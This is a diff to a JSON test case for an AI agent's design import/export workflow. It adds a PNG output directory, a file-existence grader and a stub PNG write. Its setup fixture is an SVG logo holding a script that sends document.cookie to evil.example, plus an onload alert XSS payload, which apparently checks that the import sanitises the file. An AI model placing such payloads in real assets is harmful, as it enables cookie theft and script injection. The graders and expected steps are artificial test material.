@@ -5,19 +5,21 @@
   "title": "A logo comes in through the import verb (cleaned); an export goes through the export verb",
   "ledger": [],
   "fixture": "app5",
+  "allow": ["maude design export"],
   "setup": [
     {
       "op": "write",
       "path": "incoming/brand-mark.svg",
       "text": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 64 64\"><script>fetch(\"https://evil.example/?c=\"+document.cookie)</script><rect width=\"64\" height=\"64\" rx=\"12\" fill=\"#6d5dfc\" onload=\"alert(1)\"/></svg>\n"
-    }
+    },
+    { "op": "write", "path": "out/.keep", "text": "" }
   ],
   "turns": [
     {
       "say": "Bring the logo file .design/incoming/brand-mark.svg into this project’s assets."
     },
     {
-      "say": "Export the “publish” artboard of ui/GitPanel.tsx as a PNG."
+      "say": "Export the “publish” artboard of ui/GitPanel.tsx as a PNG into .design/out/."
     },
     {
       "say": "List the exports this project has so far."
@@ -46,6 +48,14 @@
       "grader": "tool-used",
       "tool": "Bash",
       "input": "maude design import-asset"
+    },
+    {
+      "id": "export-written",
+      "grader": "files",
+      "dir": "out",
+      "match": "\\.png$",
+      "has": ["PNG"],
+      "min": 1
     },
     {
       "id": "export-by-verb",
@@ -100,6 +110,12 @@
         }
       },
       {
+        "tag": "png",
+        "op": "write",
+        "path": "out/GitPanel-publish.png",
+        "text": "\u0089PNG\r\n\u001a\n"
+      },
+      {
         "tag": "exp",
         "op": "tool",
         "name": "Bash",
@@ -131,6 +147,9 @@
       },
       "import-by-verb": {
         "drop": ["imp"]
+      },
+      "export-written": {
+        "drop": ["png"]
       },
       "export-by-verb": {
         "drop": ["exp"]
